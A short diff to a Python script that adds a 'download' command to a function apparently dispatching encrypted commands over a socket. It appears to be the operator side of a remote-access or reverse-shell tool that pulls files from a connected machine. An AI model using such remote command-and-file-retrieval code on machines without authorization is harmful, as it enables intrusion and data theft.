@@ -161,6 +161,14 @@ def passcmd():
 
             ftrans(c,cmd[7:])
 
+        elif cmd[:8]=="download":
+
+            fname=input("File Name:")
+
+            c.send(str.encode(enc(cmd)))
+
+            c.send(str.encode(enc(fname)))
+
         elif len(str.encode(cmd))>0:
 
             c.send(str.encode(enc(cmd)))
